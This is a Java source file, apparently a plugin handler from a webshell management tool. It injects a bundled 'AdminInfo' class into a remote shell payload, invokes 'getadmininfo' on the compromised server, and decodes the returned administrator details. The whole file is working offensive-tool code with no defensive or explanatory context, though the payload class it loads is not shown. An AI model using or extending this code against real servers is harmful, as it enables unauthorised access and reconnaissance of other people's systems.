package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class AdminInfoHandler extends HandlerBase{
    public String handler() {
        this.payload.include("AdminInfo", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/AdminInfo.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("AdminInfo", "getadmininfo", reqParameter));
    }
}
